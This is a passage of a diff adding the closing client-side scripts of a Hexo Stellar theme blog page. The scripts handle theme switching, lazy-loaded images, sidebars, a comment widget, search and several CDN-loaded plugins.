+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
+    el.appendChild(script);
+  }
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.7.0/style.min.css" media="all">
+
+
+
+<!-- inject -->
+
+</div></body></html>
